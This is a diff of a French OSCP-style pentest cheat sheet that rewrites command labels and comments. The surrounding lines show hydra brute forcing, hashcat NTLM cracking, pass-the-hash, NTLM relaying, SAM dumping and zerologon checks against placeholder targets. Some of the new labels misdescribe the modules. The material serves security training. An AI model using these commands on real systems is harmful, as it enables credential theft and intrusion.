@@ -14,13 +14,13 @@ Analyser les mécanismes d'authentification et les formats de hachage.
 <p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>
 
 ```bash
-# SSH Brute Force
+# Essais de mots de passe sur SSH
 hydra -l <username> -P <wordlist> -s <port> ssh://<target_ip>
 
-# FTP Brute Force
+# Essais de mots de passe sur FTP
 hydra -l <username> -P <wordlist> ftp://<target_ip>
 
-# SMB Brute Force
+# Essais de mots de passe sur SMB
 hydra -L <user_list> -P <password_list> smb://<target_ip>
 
 # Telnet Brute Force
@@ -64,7 +64,7 @@ hydra -L <user_list> -p "<password>" rdp://<target_ip>
 ```
 
 
-<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>
+<p class="oscp-command-note">Tester une authentification par hash NTLM sur WINRM avec CrackMapExec.</p>
 
 ```bash
 # WinRM password spraying
@@ -250,7 +250,7 @@ python3 -c "print(<keyspace> / <hash_rate>)"
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Estimer le temps de calcul ».</p>
+<p class="oscp-command-note">Calculer l’espace de recherche d’un mot de passe et estimer le temps de test.</p>
 
 ```bash
 # Estimation du temps de cassage d’un mot de passe alphanumérique de 5 caractères
@@ -506,10 +506,10 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Gestionnaires de mots de passe ».</p>
+<p class="oscp-command-note">Convertir un coffre KeePass en format compatible avec John ou Hashcat.</p>
 
 ```bash
-# Convert KeePass database to John format
+# Convertir la base KeePass au format de John the Ripper
 keepass2john <Database.kdbx> > keepass.hash
 
 # Rappelez-vous de supprimer le premier "'mot':" qui dit 'Database:'; il devrait ressembler à ceci:
@@ -991,13 +991,13 @@ Hash NTLM: <NTLM_HASH>
 <p class="oscp-command-note">Analyser des empreintes avec Hashcat.</p>
 
 ```bash
-# Rule is optional
+# La règle est facultative
 hashcat -m 1000 <NTLM_HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 ```
 
 
-<p class="oscp-command-note">Commande Impacket dans la rubrique « NTLM ».</p>
+<p class="oscp-command-note">Tester une connexion SMB autorisée en utilisant un hash NTLM.</p>
 
 ```bash
 # Pass-the-Hash en utilisant SMBClient
@@ -1152,7 +1152,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Relaying Net-NTLMv2 ».</p>
+<p class="oscp-command-note">Exemple de journaux d’un relais NTLM : sortie indicative, pas une commande.</p>
 
 ```bash
 [*] SMBD-Thread-4: Received connection from <victim_ip>, attacking target smb://<target_ip>
@@ -1305,7 +1305,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ### Énumération
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Interroger le service SMB avec NetExec.</p>
 
 ```bash
 netexec smb target
@@ -1411,7 +1411,7 @@ Most likely local admin ✅
 ------
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Tester les identifiants fournis sur le service SMB avec NetExec.</p>
 
 ```bash
 netexec smb target -u [username] -p '[P@$$w0rd!]'
@@ -1500,7 +1500,7 @@ netexec smb target -u [username] -p [password] -k
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Récupérer les informations de domaine, comptes, groupes et sessions via SMB avec NetExec.</p>
 
 ```bash
 netexec smb target -u [username] -p [password] --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
@@ -1529,7 +1529,7 @@ netexec smb target -u [username] -p [password] -k --get-file target_file output_
 Transférer ou récupérer des fichiers dans le laboratoire.
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Lister les fichiers accessibles sur le service FTP avec NetExec.</p>
 
 ```bash
 netexec ftp target -u [username] -p [password] --ls
@@ -1556,7 +1556,7 @@ netexec ftp target -u [username] -p [password] --ls folder_name --get file_name
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Lister les utilisateurs accessibles via LDAP avec NetExec.</p>
 
 ```bash
 netexec ldap target -u '' -p '' --users
@@ -1590,7 +1590,7 @@ netexec ldap target -u [username] -p [password] --asreproast asrep.txt
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Tester les identifiants fournis sur le service MSSQL avec NetExec.</p>
 
 ```bash
 netexec mssql target -u [username] -p [password]
@@ -1621,7 +1621,7 @@ netexec mssql target -u [username] -p [password] --get-file output_file target_f
 ### Extraction de secrets avec SecretsDump
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Examiner les secrets SAM accessibles par SMB avec NetExec (droits élevés requis).</p>
 
 ```bash
 nxc smb target -u [username] -p [password] --sam
@@ -1740,7 +1740,7 @@ bh_pass = pass
 ```
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Collecter les informations de domaine pour BloodHound via NetExec.</p>
 
 ```bash
 netexec ldap [target] -u [username] -p [password] --bloodhound -ns ip --collection All
@@ -1753,7 +1753,7 @@ netexec ldap [target] -u [username] -p [password] --bloodhound -ns ip --collecti
 Examiner les entrées et les réponses de l'application web.
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Vérifier la présence de WebDAV via SMB avec NetExec.</p>
 
 ```bash
 netexec smb ip -u [username] -p [password] -M webdav 
@@ -1764,7 +1764,7 @@ netexec smb ip -u [username] -p [password] -M webdav
 #### Veeam
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Vérifier les configurations Veeam exposées via SMB avec NetExec.</p>
 
 ```bash
 netexec smb [target] -u [username] -p [password] -M veeam
@@ -1775,7 +1775,7 @@ netexec smb [target] -u [username] -p [password] -M veeam
 #### slinky
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Lancer le module Slinky avec NetExec (modifie potentiellement des ressources distantes).</p>
 
 ```bash
 netexec smb ip -u [username] -p [password] -M slinky 
@@ -1786,7 +1786,7 @@ netexec smb ip -u [username] -p [password] -M slinky
 #### ntdsutil
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Tester les identifiants fournis sur le service SMB avec NetExec.</p>
 
 ```bash
 netexec smb ip -u [username] -p [password] -M ntdsutil 
@@ -1799,7 +1799,7 @@ netexec smb ip -u [username] -p [password] -M ntdsutil
 Examiner les objets, les droits et les services du domaine.
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Tester les identifiants fournis sur le service LDAP avec NetExec.</p>
 
 ```bash
 netexec ldap [target] -u [username] -p [password] -M ldap-checker
@@ -1810,7 +1810,7 @@ netexec ldap [target] -u [username] -p [password] -M ldap-checker
 #### Vérifier les vulnérabilités Zerologon, PetitPotam et noPac du contrôleur de domaine
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Tester les identifiants fournis sur le service SMB avec NetExec.</p>
 
 ```bash
 netexec smb [target] -u [username] -p [password] -M zerologon
@@ -1825,7 +1825,7 @@ netexec smb [target] -u [username] -p [password] -M nopac
 #### Vérifier l’attribut MachineAccountQuota
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Tester les identifiants fournis sur le service LDAP avec NetExec.</p>
 
 ```bash
 netexec ldap [target] -u [username] -p [password] -M maq
@@ -1836,7 +1836,7 @@ netexec ldap [target] -u [username] -p [password] -M maq
 #### Énumération des services de certificats AD (AD CS)
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Tester les identifiants fournis sur le service LDAP avec NetExec.</p>
 
 ```bash
 netexec ldap [target] -u [username] -p [password] -M adcs
@@ -1849,7 +1849,7 @@ netexec ldap [target] -u [username] -p [password] -M adcs
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Tester les identifiants fournis sur le service SMB avec NetExec.</p>
 
 ```bash
 netexec smb [target] -u [username] -p [password] -M msol
@@ -1860,7 +1860,7 @@ netexec smb [target] -u [username] -p [password] -M msol
 #### Relais NTLM
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Interroger le service SMB avec NetExec.</p>
 
 ```bash
 netexec smb [target(s)] --gen-relay-list relay.txt
@@ -1901,7 +1901,7 @@ impacket-ntlmrelayx -tf relay.txt -smb2support
 ### Usurpation de l’identité des utilisateurs connectés (Impersonation)
 
 
-<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>
+<p class="oscp-command-note">Rechercher les utilisateurs connectés visibles via SMB.</p>
 
 ```bash
 nxc smb [target] -u [localAdmin] -p [password] --loggedon-users
